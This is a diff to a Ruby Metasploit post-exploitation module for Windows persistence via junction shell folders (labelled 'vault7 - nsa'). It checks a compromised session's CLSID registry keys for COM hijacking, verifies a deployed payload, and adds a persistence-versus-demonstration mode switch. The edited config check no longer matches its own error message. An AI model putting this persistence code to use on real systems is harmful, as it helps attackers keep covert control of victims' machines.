@@ -211,15 +211,21 @@ def run
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
   #
-  if datastore['APPL_PATH'] == 'nil' || datastore['FOLDER_PATH'] == 'nil'
+  if datastore['PERSIST_EXPLORER'] == 'nil' || datastore['FOLDER_PATH'] == 'nil'
     print_error("Options not configurated correctly ..")
     print_warning("Please set APPL_PATH | FOLDER_PATH!")
     return nil
   else
-    print_status("junction shell folders (vault7 - nsa)!")
+    print_status("junction shell folders (vault7 - nsa)")
     Rex::sleep(1.5)
   end
 
+  # mode sellected
+  if datastore['APPL_PATH'] == true || datastore['RENAME_PERSIST'] == true
+    print_warning("Persistence mode sellected")
+  else
+    print_status("Demonstration mode sellected")
+  end
 
     #
     # Search in target regedit if hijack hive exists .. 
@@ -227,7 +233,7 @@ def run
     print_status("Reading target registry hive keys ..")
     Rex::sleep(1.0)
     if registry_enumkeys("HKCU\\Software\\Classes\\CLSID")
-      print_good("Remote registry hive key found!")
+      print_status("Remote registry hive key found!")
       Rex::sleep(1.0)
     else
       # registry hive key not found, aborting module execution ..
@@ -244,7 +250,7 @@ def run
     #
     print_status("check if APPL exists in target ..")
     if session.fs.file.exist?(app_path)
-      print_good("Application (payload) found ..")
+      print_status("Application (payload) found ..")
     else
       print_error("Not found: #{app_path}")
       print_warning("Deploy your [payload] before using this module ..")
